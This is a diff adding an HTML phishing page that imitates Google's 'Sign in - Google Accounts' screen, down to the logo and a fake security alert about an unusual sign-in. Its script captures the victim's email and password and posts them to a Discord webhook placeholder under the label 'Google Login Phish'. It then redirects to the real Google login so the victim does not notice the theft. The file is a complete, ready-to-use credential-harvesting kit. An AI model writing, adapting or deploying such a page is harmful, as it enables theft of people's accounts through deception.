@@ -1,0 +1,148 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign in - Google Accounts</title>
+  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+      background: #fff;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 380px;
+      margin: 100px auto;
+      padding: 40px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 30px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 10px;
+      text-align: center;
+      color: #202124;
+    }
+
+    .alert {
+      background: #fef7e0;
+      border-left: 4px solid #fbbc04;
+      padding: 12px;
+      font-size: 14px;
+      margin-bottom: 20px;
+      color: #5f6368;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-top: 10px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 25px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      font-size: 14px;
+      font-weight: 500;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 20px;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo" width="75" />
+    <div class="alert">
+      We’ve detected an unusual sign-in attempt from a new device. For your security, please verify your identity.
+    </div>
+
+    <h1>Sign in</h1>
+
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email or phone" required />
+      <div id="passwordField" class="hidden">
+        <input type="password" id="password" placeholder="Enter your password" required />
+      </div>
+      <button type="submit" id="nextBtn">Next</button>
+    </form>
+
+    <div class="footer">Not your device? Use Guest mode to sign in privately.</div>
+  </div>
+
+  <script>
+    const webhook = "YOUR_DISCORD_WEBHOOK_URL"; // Replace
+
+    const form = document.getElementById("loginForm");
+    const emailInput = document.getElementById("email");
+    const passwordDiv = document.getElementById("passwordField");
+    const passwordInput = document.getElementById("password");
+    const nextBtn = document.getElementById("nextBtn");
+
+    let stage = 1; // 1: entering email, 2: entering password
+    let email = "";
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      if (stage === 1) {
+        email = emailInput.value.trim();
+        emailInput.setAttribute("disabled", "true");
+        passwordDiv.classList.remove("hidden");
+        nextBtn.textContent = "Login";
+        stage = 2;
+      } else if (stage === 2) {
+        const password = passwordInput.value;
+
+        // Send to webhook
+        fetch(webhook, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            content: `📥 **Google Login Phish**\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\``,
+          }),
+        });
+
+        // Optional: redirect to real Google login
+        window.location.href = "https://accounts.google.com/signin/v2/identifier";
+      }
+    });
+  </script>
+</body>
+</html>
